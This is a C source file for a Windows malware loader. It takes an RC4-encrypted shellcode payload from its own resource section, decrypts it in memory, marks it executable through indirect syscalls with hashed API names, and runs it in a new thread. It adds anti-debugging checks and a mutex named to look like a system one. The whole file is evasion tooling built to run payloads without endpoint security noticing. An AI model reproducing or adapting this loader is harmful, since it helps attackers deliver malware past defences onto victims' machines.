#include "structs.h"
#include "debug.h"

// Custom loader api function
#include "custom_loaderapi.h"

// Crypt
#include "rc4.h"

// Anti-XXXX functions
#include "anti-debug.h"

// Indirect syscalls via tartarus gate
#include "indirect_syscall.h"

#include "mutex.h"

// Include all typedefs and string hashes
#include "typedefs.h"

// include the resource (shellcode)
#include "resource.h"

// uncomment to enable debug mode
//
#define DEBUG

#define ERR -0x1
#define SUCCESS 0x0

BOOL InitializeNtSyscalls();
int _TIGER(HANDLE hMutex);

// Global variable for the NTDLL config
NTDLL_STRUCT _G_NtdllConf = { 0 };

// Global Variable
NTAPI_FUNC _G_NTFUNC = { 0 };

int main(void) {

	//PRINTA("======== Press Enter to start ========\n");

	HANDLE hMutex = _CreateMutex(L"SM0:TIG0:63772:120:WilError_03");
	BOOL MutexRes = FALSE;

	if (hMutex == ERROR_ALREADY_EXISTS) {
		return ERR;
	} 
	if (hMutex != NULL) {
#ifdef DEBUG
		PRINTA("[+] Mutex created ! (%d) \n", GetLastError());
#endif
	}

	//PRINTA("======== Press Enter to continue ========\n");
	//getchar();

	// ---------------------

	BOOL Debug1 = AntiDebugPEBCheck();
	BOOL Debug2 = NtGlobalFlagCheck();
	BOOL Debug3 = DelayExecution(1);
	if (Debug3 == TRUE) {
#ifdef DEBUG
		PRINTA("Debugging attempted !\n");
#endif
		return -1;
	}

#ifdef DEBUG
		PRINTA("Real environment !\n");
#endif
	

	/*
	HMODULE hKernel32 = _GetModuleHandle(KERNEL32_HASH);
	HMODULE hNtdll = _GetModuleHandle(NTDLL_HASH);
	if (hKernel32 == NULL || hNtdll == NULL) {
		//PRINTA("[-] Unable to obtain address of kernel32/ntdll in memory\n");
		return ERR;
	}
	*/
	////PRINTA("[+] Address of ->\n\t| KERNEL32 -> %#p\n\t| NTDLL -> %#p\n", hKernel32, hNtdll);
	
	//FARPROC ntapi = _GetProcAddress(hNtdll, NTALLOCATEVIRTUALMEMORY);
	//FARPROC k32api = _GetProcAddress(hKernel32, VIRTUALALLOC);

	////PRINTA("[+] Address of -> \n\t| NtAllocateVirtualMemory -> %#p\n\t| VirtualAlloc -> %#p\n", ntapi, k32api);

	return 0;

	_TIGER(hMutex);

	return SUCCESS;
}

// Populate the NTAPI_FUNC->NTSYSAPI structure with information about a syscall
BOOL InitializeNtSyscalls() {

	if (!ObtainSyscall(NTALLOCATEVIRTUALMEMORY_HASH, &_G_NTFUNC.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtAllocateVirtualMemory.dwSSN, _G_NTFUNC.NtAllocateVirtualMemory.pRandSyscallAddress);
#endif

	if (!ObtainSyscall(NTPROTECTVIRTUALMEMORY_HASH, &_G_NTFUNC.NtProtectVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtProtectVirtualMemory.dwSSN, _G_NTFUNC.NtProtectVirtualMemory.pRandSyscallAddress);
#endif
	if (!ObtainSyscall(NTCREATETHREADEX_HASH, &_G_NTFUNC.NtCreateThreadEx)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtCreateThreadEx.dwSSN, _G_NTFUNC.NtCreateThreadEx.pRandSyscallAddress);
#endif
	if (!ObtainSyscall(NTWAITFORSINGLEOBJECT_HASH, &_G_NTFUNC.NtWaitForSingleObject)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtWaitForSingleObject.dwSSN, _G_NTFUNC.NtWaitForSingleObject.pRandSyscallAddress);
#endif
	return TRUE;
}

int _TIGER(HANDLE hMutex) {

	t_FindResourceW FindResourceW		= (t_FindResourceW)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FINDRESOURCEW_HASH);
	t_LoadResource LoadResource			= (t_LoadResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOADRESOURCE_HASH);
	t_LockResource LockResource			= (t_LockResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOCKRESOURCE_HASH);
	t_SizeofResource SizeofResource		= (t_SizeofResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), SIZEOFRESOURCE_HASH);

	// Get the shellcode from resource (.rsrc)
	HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_SCODE1), RT_RCDATA);
	HGLOBAL resHandle = LoadResource(NULL, res);
	unsigned char* payload = (unsigned char*)LockResource(resHandle);
	SIZE_T sSize = SizeofResource(NULL, res);

	//---------------------------------------

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	//SIZE_T		sSize = sizeof(Payload);
	DWORD		dwOld = NULL;
	HANDLE		hProcess = (HANDLE)-1,	// local process
				hThread = NULL;


	const char key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
	SIZE_T sizeKey = sizeof(key);


	// initializing the used syscalls
	if (!InitializeNtSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
#endif
		return -1;
	}

	// allocating memory
	SET_SYSCALL(_G_NTFUNC.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	// copying the payload
	if (memcpy(pAddress, payload, sSize)) {
#ifdef DEBUG
		PRINTA("[+] Memory moved ! (ADDR: %#p)\n", pAddress);
#endif
		if ((STATUS = CryptMemory032(pAddress, sSize, key, sizeKey)) != 0x00) {
#ifdef DEBUG
			PRINTA("Decryption Failed ! (STATUS 0x%0.8X)\n", STATUS);
#endif
			return -1;
		}
	}
	else {
		return -1;
	}

	// changing memory protection
	SET_SYSCALL(_G_NTFUNC.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}


	// executing the payload
	SET_SYSCALL(_G_NTFUNC.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}


	// waiting for the payload
	SET_SYSCALL(_G_NTFUNC.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}
#ifdef DEBUG
	PRINTA("[#] Press <Enter> To Quit ... ");
#endif

	HANDLE MutexRes = _DestroyMutex(hMutex);
	if (MutexRes != TRUE) {
		return -1;
	}
}